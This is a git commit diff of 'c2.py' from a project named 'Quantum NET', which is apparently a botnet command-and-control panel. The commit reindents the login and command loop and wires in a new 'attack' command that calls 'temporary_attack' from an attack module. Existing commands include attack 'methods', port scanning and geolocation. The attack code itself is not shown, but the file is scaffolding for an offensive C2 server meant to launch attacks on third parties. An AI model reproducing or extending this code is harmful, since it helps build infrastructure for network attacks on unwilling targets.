a7e5aeb627f5b53bbf7f4841189b7eab26452436
n4no <74839733+Preauthorized@users.noreply.github.com>
2021-05-25 10:24:42 -0400

    Update c2.py

--- c2.py
+++ c2.py
@@ -35,6 +35,7 @@ from assets.Commands.geo import *
 from assets.Commands.cf import *
 from assets.Commands.admin import *
 from assets.Commands.portscan import *
+from assets.Commands.attack import *
 from netControl.get_usage import *
 
 # if utils.GetOS() == True:
@@ -65,73 +66,78 @@ print(f"[{datetime.datetime.now()}] | Quantum Started | {host} | {port} |") # Ad
 Discord.send_status(f"Quantum NET successfully started!\n\nHost: {host} | Port {port}\r\nTime: {utils.CurrentTime()}")
 
 def handle_connection(client, addr):
-    utils.set_Title(client, "Login")
+        Current.CurrentInfo['IP'] = addr[0]
+        utils.set_Title(client, "Login")
 
-    # User Input Login Section
-    client.send("Username: ".encode())
-    username = client.recv(buffer_length).decode().strip().replace("\r\n", "")
-    client.recv(1024).decode()
-    client.send("Password: ".encode())
-    password = client.recv(buffer_length).decode().strip().replace("\r\n", "")
+        # User Input Login Section
+        client.send("Username: ".encode())
+        username = client.recv(buffer_length).decode().strip().replace("\r\n", "")
+        client.send("Password: ".encode())
+        password = client.recv(buffer_length).decode().strip().replace("\r\n", "")
 
-    client.send(f"{username} | {password}\r\n".encode())
-    client.send("Welcome to Quantum Net\r\n".encode())
+        client.send(f"{username} | {password}\r\n".encode())
+        client.send("Welcome to Quantum Net\r\n".encode())
 
-    # Login Check
-    if "[+]" in Auth.Login(username, password, addr[0]): # This is a weird way of authentication lol 
-        client.send(f"Welcome: {username}\r\n".encode())
-        client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main")).encode())
-        MainLogger.Log(f"login: {username} | {password} {utils.CurrentTime()}", True)
-    else:
-        client.send("[x] Error, Incorrect username or password. Try again....".encode())
-        time.sleep(4)
-        client.close()
-
-    utils.set_Title(client, f"Quantum NET | User: {username}")
-
-    while(True):
-        client.send(Strings.hostname(username).encode())
-        data = str(client.recv(buffer_length).decode()).strip().replace("\r\n", "")
-
-        # Command Handling
-        if data != "\r\n" or data != "":
-                Current.CurrentCmd["args"] = data.split(" ")
-                # Current.CurrentCmd['Cmd'] = data[0]
-                Current.CurrentCmd["fullcmd"] = data
+        # Login Check
+        if "[+]" in Auth.Login(username, password, addr[0]): # This is a weird way of authentication lol 
+                client.send(f"Welcome: {username}\r\n".encode())
                 Current.CurrentInfo['Username'] = username
+                client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main") + "\r\n" + BannerModify.GetBannerFromFile("net_stats")).encode())
+                MainLogger.Log(f"login: {username} | {password} {utils.CurrentTime()}", True)
+        else:
+                client.send("[x] Error, Incorrect username or password. Try again....".encode())
+                time.sleep(4)
+                client.close()
 
-        client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main")).encode())
+        utils.set_Title(client, f"Quantum NET | User: {username}")
 
-        if data.lower() == "help" or data.lower() == "?":
-                client.send(str(BannerModify.GetBannerFromFile("help")).encode())
-        elif data.lower() == "clear" or data.lower() == "cls":
-                client.send(str(BannerModify.GetBannerFromFile("main")).encode())
-        elif data.lower() == "methods":
-                client.send(str(BannerModify.GetBannerFromFile("methods")).encode())
-        elif data.lower() == "api_status":
-                client.send(str(BannerModify.GetBannerFromFile("api_status")).encode())
-        elif data.lower() == "playboy":
-                client.send(str(BannerModify.GetBannerFromFile("playboy")).encode())     
-        elif data.lower() == "usage":
-                client.send(str(Usage.Usage()).encode())
-        elif data.lower().startswith("geo"):
-                geo_command(client, Current.CurrentCmd["args"])
-        elif data.lower().startswith("pscan"):
-                pScan_command(client, Current.CurrentCmd['args'])
-        elif data.lower().startswith("admin"):
-                Admin_Command(client, Current.CurrentCmd['args'])
-        if data != "\r\n" or data != "":
-                MainLogger.Log("CMD", True)
+        while(True):
+                Current.CurrentInfo['Username'] = username
+                client.send(Strings.hostname(username).encode())
+                data = str(client.recv(buffer_length).decode()).strip().replace("\r\n", "")
+
+                # Command Handling
+                if data != "\r\n" or data != "":
+                        Current.CurrentCmd["args"] = data.split(" ")
+                        # Current.CurrentCmd['Cmd'] = data[0]
+                        Current.CurrentCmd["fullcmd"] = data
+                        Current.CurrentInfo['Username'] = username
+
+                client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main")).encode())
+
+                if data.lower() == "help" or data.lower() == "?":
+                        client.send(str(BannerModify.GetBannerFromFile("help")).encode())
+                elif data.lower() == "clear" or data.lower() == "cls":
+                        continue
+                elif data.lower() == "methods":
+                        client.send(str(BannerModify.GetBannerFromFile("methods")).encode())
+                elif data.lower() == "api_status":
+                        client.send(str(BannerModify.GetBannerFromFile("api_status")).encode())
+                elif data.lower() == "playboy":
+                        client.send(str(BannerModify.GetBannerFromFile("playboy")).encode())     
+                elif data.lower() == "usage":
+                        client.send(str(Usage.Usage()).encode())
+                elif data.lower().startswith("geo"):
+                        geo_command(client, Current.CurrentCmd["args"])
+                elif data.lower().startswith("pscan"):
+                        pScan_command(client, Current.CurrentCmd['args'])
+                elif data.lower().startswith("attack"):
+                        temporary_attack(client, Current.CurrentCmd['args'])
+                elif data.lower().startswith("admin"):
+                        Admin_Command(client, Current.CurrentCmd['args'])
+                        
+                if data != "\r\n" or data != "":
+                        MainLogger.Log("CMD", True)
 
 
 def listener():
-    while True:
-        client, address = sock.accept()
-        try:
-                threading.Thread(target=handle_connection, args=(client, address)).start()
-        except:
-                print("Client Disconnected!")
-        print(Strings.MainColors['Red'] + "TCP Connection From " + address[0] + ":" + str(address[1]) + Strings.MainColors['Reset'])
+        while True:
+                client, address = sock.accept()
+                try:
+                        threading.Thread(target=handle_connection, args=(client, address)).start()
+                except:
+                        print("Client Disconnected!")
+                print(Strings.MainColors['Red'] + "TCP Connection From " + address[0] + ":" + str(address[1]) + Strings.MainColors['Reset'])
 
 
 threading.Thread(target=listener).start()
